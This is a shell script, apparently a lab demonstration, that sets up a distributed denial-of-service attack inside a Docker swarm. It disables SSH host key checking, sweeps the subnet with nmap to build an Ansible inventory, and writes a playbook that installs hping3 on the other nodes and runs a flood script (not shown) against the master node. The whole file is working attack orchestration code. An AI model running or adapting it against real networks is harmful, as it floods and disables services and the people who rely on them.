# DDoS attack orchistrated by kali user to run inside docker swarm with ansible
# Master node inside swarm is getting attacked from all other nodes

# Create ansible project folder
rm -rf ansible
mkdir ansible
cd ansible

# Create ansible.cfg file to disable host key checking (generally not a secure way to ssh, using just for the demo)
cat << EOF > ansible.cfg
[ssh_connection]
host_key_checking = False
EOF

# Dynamically get network IP of the docker network interface (change netint variable accordingly, in my case its br-10a0e22dc516)
netint=br-e0e2d0dba343
netip=$(ifconfig $netint|grep inet|sed -n 1p|awk "{print \$2}"|cut -f 1-3 -d "."|sed 's/$/.*/')

# Create the inventory.yml file which will contain the target IPs for ansible. 
echo "[targets]" >> inventory.yml

# Use nmap to find and extract all IPs in the network (append them in the inventory.yml file)
echo "Finding network IPs and appending them to inventory.yml..."
nmap -sP $netip|grep $netip|awk "{print \$5}" >> inventory.yml

# We assume the masters' IP is *.*.*.2 and we remove it from the yml file, as well as the networks' gateway IP
grep -v -e "\.1$" -e "\.2$" inventory.yml > inventory_filtered.yml
mv inventory_filtered.yml inventory.yml

# create yml file with tasks for ansible to execute on target machines 
cat << EOF > playground.yml
---
- hosts: targets
  remote_user: docker
  gather_facts: no
  vars:
    user: "docker"

  tasks:

    - name: Install hping3
      become: true
      apt:
        update_cache: 'yes'
        force_apt_get: 'yes'
        install_recommends: true
        autoremove: true
        name: hping3
        state: present

    - name: Copy flood script to remote host
      copy:
        src: ../flood.sh
        dest: /home/docker/flood.sh
        mode: 0755

    - name: Run script on remote host
      shell: sh /home/docker/flood.sh
EOF

# run ansible
echo "Running Ansible"
ansible-playbook -i inventory.yml playground.yml --ask-pass --ask-become-pass